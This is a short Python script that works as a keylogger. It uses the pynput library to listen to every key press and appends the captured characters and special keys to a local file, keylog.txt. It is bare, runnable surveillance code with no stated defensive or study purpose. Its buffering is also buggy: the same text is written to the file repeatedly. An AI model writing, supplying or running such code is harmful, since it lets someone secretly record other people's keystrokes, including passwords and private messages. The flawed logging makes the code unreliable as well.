import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    # Adjust the length of log if needed, to prevent it from growing indefinitely
    if len(log) > 50:
        save_log(log)
        log = ""

    with open("keylog.txt", "a") as f:
        f.write(log)
        f.close()

def save_log(log):
    file_path = "keylog.txt"
    with open(file_path, "a") as f:
        f.write(log)

# Start listening for key presses
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
